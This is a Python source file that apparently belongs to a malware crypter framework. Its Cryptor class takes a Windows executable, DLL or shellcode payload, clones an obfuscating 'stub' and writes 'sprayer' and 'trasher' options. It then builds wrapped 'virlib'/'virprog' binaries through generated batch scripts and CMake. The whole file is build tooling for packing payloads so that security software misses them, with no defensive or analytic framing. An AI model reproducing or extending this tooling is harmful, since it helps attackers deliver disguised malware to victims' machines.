import random, json, pefile, os
from typing import Dict, IO
from subprocess import PIPE, Popen

from c2.validate_opts import *
from c2._scenario_builder import ScenarioBuilder, Scenario
from c2.infra.unischema import Unischema, unischema_load
from c2.infra.seed_db import SeedDB
from c2.infra.seed import DEFAULT_SEED_SIZE
from c2.base.stage_runner import StageRunner
from c2.common.dir_from_template import dir_from_template

_sd = os.path.dirname(__file__)


class CryptorFactory:
  def __init__(self, cryptor_name='normal'):
    self._cryptor_name = cryptor_name

  def create_cryptor(self, file_path, pay_info, crp_opts, sys_opts, rnd_opts,
                     out_dir, solution_name, log_stream:IO) -> 'CryptorBase':

    if self._cryptor_name == 'normal':
      return Cryptor(file_path, pay_info, crp_opts, sys_opts, rnd_opts,
                     out_dir, solution_name, log_stream)

    elif self._cryptor_name == 'fake':
      raise RuntimeError('this is only a possible future functionality')
    else:
      raise RuntimeError(f'unknown cryptor name - {self._cryptor_name}')


# Base for both Cryptor and FakeCryptor; not all Cryptors wants rng, so we don't have it here.
# FakeCryptor is now just a demonstration, so there is only one real Cryptor
class CryptorBase(StageRunner):
  def __init__(self, file_path, pay_info, crp_opts, sys_opts, rnd_opts, out_dir, solution_name, log_stream):
    super().__init__()

    validate_pay_info(pay_info)
    validate_crp_opts(crp_opts)
    validate_sys_opts(sys_opts)
    validate_rnd_opts(rnd_opts)

    self.file_path = file_path
    self.pay_info = pay_info
    self.crp_opts = crp_opts
    self.sys_opts = sys_opts
    self.rnd_opts = rnd_opts

    self.out_dir = out_dir
    self._solution_name = solution_name
    self._logf = log_stream
    # must watch: ScenarioBuilder create_seed_file.py if-not-exist <- not tested. test manually!
    self._seed_db = SeedDB(DEFAULT_SEED_SIZE)
    self._seed_db.read_from_dict(rnd_opts['seeds'], generate_where_empty=True)

  def _st_clone_stub(self): raise NotImplementedError()
  def _st_build_configurator(self): raise NotImplementedError()
  def _st_save_configurator(self): raise NotImplementedError()
  def _st_put_opt_files(self): raise NotImplementedError()
  def _st_call_configurator(self): raise NotImplementedError()
  def _st_call_bootstrap(self): raise NotImplementedError()
  def _st_regen(self): raise NotImplementedError()

  # build
  def build(self, configuration, project): raise NotImplementedError()

  # only after call_configurator()
  def get_outdata(self) -> dict:
    return json.load(open(fr'{self.out_dir}/_OUTDATA_.json', 'r'))

  # { 'DebugSprayed': { 'virlib':  'path/to/virlib.dll', 'virprog': '...', }, 'Release': { ... } }
  def get_out_bin_paths(self) -> Dict[str, Dict[str, str]]:
    assert(self.pay_info['cpu'] == 'intel86' or self.pay_info['cpu'] == 'intel64')
    arch = '86' if self.pay_info['cpu'] == 'intel86' else '64'
    r = {}
    for cfg in ['Debug', 'DebugSprayed', 'Release', 'ReleaseSprayed']:
      for prj in ['virlib', 'virprog']:
        fname = prj + ('.dll' if prj == 'virlib' else '.exe')
        r.setdefault(cfg, {})[prj] = f'{self.out_dir}/build{arch}/{cfg}/{fname}'
    return r



# Demonstration
class FakeCryptor(CryptorBase):
  pass


# Real cryptor
class Cryptor(CryptorBase):
  def __init__(self, file_path, pay_info, crp_opts, sys_opts, rnd_opts, out_dir, solution_name, log_stream:IO):
    super().__init__(file_path, pay_info, crp_opts, sys_opts, rnd_opts, out_dir, solution_name, log_stream)

    #self._stub_name = 'alpha'
    self._cryptor_root_abs = os.path.abspath(_sd)
    self._tools_dir = self._cryptor_root_abs + '/stub_tools'
    self._sprayer_dir = self._cryptor_root_abs + '/sprayer'
    self._stub_dir = self._cryptor_root_abs + '/stub'

    #
    slash = lambda s: s.replace('/', '\\')
    _subs = {
      #'@': slash(self.out_dir),
      '@': '%~dp0',
      '$(Tools)': slash(self._tools_dir),
      '$(CrRoot)': slash(self._cryptor_root_abs),
      '$(Sprayer)': slash(self._sprayer_dir),
      #$(OldSprayer) -> obsolete, removed
    }
    self._scenario = Scenario(self.out_dir, _subs)
    self._scenario_builder = ScenarioBuilder(
      self._scenario, self.pay_info, self.crp_opts, self.sys_opts, file_path
    )
    self._archn = '86' if self.pay_info['cpu'] == 'intel86' else '64'

    self._proceed_to_next_stage(self._st_check_input_file, 'check input file')


  def _st_check_input_file(self):
    self._proceed_to_next_stage(self._st_clone_stub, 'clone stub')
    if self.crp_opts['no_check_bin']:
      return
    # check TLS, CPU match
    if self.pay_info['bin_type'] in ['win_exe', 'win_dll']:
      pe = pefile.PE(self.file_path, fast_load=True)
      pe.parse_data_directories([pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']])
      if not self.crp_opts['allow_tls']:
        if hasattr(pe, 'DIRECTORY_ENTRY_TLS'):
          raise RuntimeError('TLS not supported')
      if pe.FILE_HEADER.Machine == 0x8664: #IMAGE_FILE_MACHINE_AMD64
        if self.pay_info['cpu'] != 'intel64':
          raise RuntimeError(f'mismatch: {self.pay_info["cpu"]=} != intel64 ({pe.FILE_HEADER.Machine=})')
      elif pe.FILE_HEADER.Machine == 0x014c: #IMAGE_FILE_MACHINE_I386
        if self.pay_info['cpu'] != 'intel86':
          raise RuntimeError(f'mismatch: {self.pay_info["cpu"]=} != intel86 ({pe.FILE_HEADER.Machine=})')
      else:
        raise RuntimeError(f'unknown {pe.FILE_HEADER.Machine=}')
    else:
      # No known ways to validate shellcode
      pass

  def _st_clone_stub(self):
    replmap = {'__stub1__': self._solution_name}
    dir_from_template(self._stub_dir, self.out_dir, replmap, silent=True)
    self._proceed_to_next_stage(self._st_build_configurator, 'build configurator')

  def _st_build_configurator(self):
    self._scenario_builder.build()
    self._proceed_to_next_stage(self._st_save_configurator, 'save configurator')

  def _st_save_configurator(self):
    bat = self._scenario.export_bat_to_file(r'@/CONFIGURATOR.BAT')
    self._proceed_to_next_stage(self._st_put_opt_files, 'put opt files')


  def _st_put_opt_files(self):
    # put spraygen opts json file
    json.dump(self.crp_opts['spg'], open(f'{self.out_dir}/spraygen_opts.json', 'w'), indent=2)

    if self.crp_opts['trasher_enabled']:
      json.dump(self.crp_opts['trasher'], open(f'{self.out_dir}/trasher_opts.json', 'w'), indent=2)

    json.dump(self.crp_opts['evp'], open(f'{self.out_dir}/evp_opts.json', 'w'), indent=2)

    if self._seed_db != None:
      # save it now so it won't be generated
      self._seed_db.write_to_file(open(f'{self.out_dir}/seedfile', 'w'))

    self._proceed_to_next_stage(self._st_call_configurator, 'call configurator')


  def _st_call_configurator(self):
    self._execute(f'"{self.out_dir}/CONFIGURATOR.BAT"')
    self._proceed_to_next_stage(self._st_call_bootstrap, 'call bootstrap')

  def _st_call_bootstrap(self):
    self._execute(f'"{self.out_dir}/bootstrap.bat"')
    self._proceed_to_next_stage(self._st_regen, 'CMake regenerate')

  def _st_regen(self):
    self._execute(f'"{self.out_dir}/regen{self._archn}.bat"')
    self._proceed_to_next_stage(None, None) ### ### ### WE'RE DONE ### ### ###


  def build(self, configuration, project):
    #Security
    assert(configuration in ['Debug', 'Release', 'DebugSprayed', 'ReleaseSprayed'])
    assert(project in ['virprog', 'virlib'])
    self._execute(fr'cmake --build {self.out_dir}\build{self._archn} --target {project} --config {configuration}')


  def _writelog(self, msg):
    self._logf.write(msg)

  def _execute(self, cmd, expect_code=0):
    w = self._writelog
    w('----[COMMAND]------------------------------\n')
    w(f' |Command: {cmd}\n')
    child = Popen(args=cmd, stdout=PIPE, stderr=PIPE, shell=True)
    stdout_data, stderr_data = child.communicate()
    stdout_decoded = stdout_data.decode().replace('\r\n', '\n')
    stderr_decoded = stderr_data.decode().replace('\r\n', '\n')
    #output_str = output.decode('utf-8') #if we want str
    if child.returncode != expect_code:
      msg = f'Result: !!!FAIL!!!. EXIT CODE {child.returncode}, not {expect_code})\n'
      # When fail, also print to stdout
      print(f'***************** Program returned unexpected code - {cmd}')
      print('Program\'s STDOUT:')
      print(stdout_data.decode('utf-8'))
      print('Program\'s STDERR:')
      print(stderr_data.decode('utf-8'))
    else:
      msg = ' |Result: SUCCESS\n'
    msg += ' |STDOUT->\n'
    w(msg)
    w(stdout_decoded)
    msg += ' |STDERR->\n'
    w(msg)
    w(stderr_decoded)
    w('--------------------------------------------\n')
    w('\n')
    self._logf.flush()
    if child.returncode != expect_code:
      raise RuntimeError(f'FAILED cmd - {cmd}  -- (returned {child.returncode}, not {expect_code}), see log')



if __name__ == '__main__':
  raise RuntimeError('tests are in test_cryptor.py')







